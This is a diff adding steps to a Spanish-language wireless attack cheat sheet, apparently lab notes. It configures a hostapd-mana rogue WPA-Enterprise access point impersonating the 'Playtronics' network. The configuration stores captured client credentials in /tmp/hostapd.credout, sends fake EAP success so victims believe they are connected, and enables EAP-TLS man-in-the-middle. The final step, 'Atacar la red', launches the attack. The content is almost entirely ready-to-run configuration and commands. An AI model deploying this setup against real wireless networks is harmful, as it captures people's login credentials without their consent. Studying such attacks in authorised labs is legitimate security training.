@@ -53,13 +53,99 @@
 ![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/2e89a53d-bb92-4d7e-a55d-54e75b1a192c)
 ![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/0a3c1be0-4166-4720-98d7-7a8eaa40dfd8)
 
+### 13. Compilar cambios
+```
+sudo -s
+```
+```
+cd /etc/freeradius/3.0/certs/    
+```
+```
+rm dh
+```
+```
+make
+```
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/7163a4a2-60e1-4687-8311-b06d53031ce3)
+```
+exit
+```
 
+### 14. Configuración de mana
+```
+sudo mousepad /etc/hostapd-mana/mana.conf
+```
+```
+# SSID of the AP
+ssid=Playtronics
 
+# Network interface to use and driver type
+# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+interface=wlan0
+driver=nl80211
 
+# Channel and mode
+# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
 
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
 
+# Key workaround for Win XP
+eapol_key_index_workaround=0
 
+# EAP user file we created earlier
+eap_user_file=/etc/hostapd-mana/mana.eap_user
 
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually 'whatever'
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it's connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
+```
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/7f3291d4-29a3-4b4c-a423-ec640e6688d3)
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/bb4512bc-0877-41db-a518-38062e6a83cc)
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/59812d86-98cb-44d4-8261-c2d6276d3b8b)
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/4d9359ef-3af4-4604-92f4-5a4d2985911e)
+```
+sudo mousepad /etc/hostapd-mana/mana.eap_user
+```
+```
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+```
+![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/ead46ca8-3062-49c7-9ecb-35fe974bcaa1)
+
+### 15. Atacar la red
+
+    sudo hostapd-mana /etc/hostapd-mana/mana.conf
 
 
 
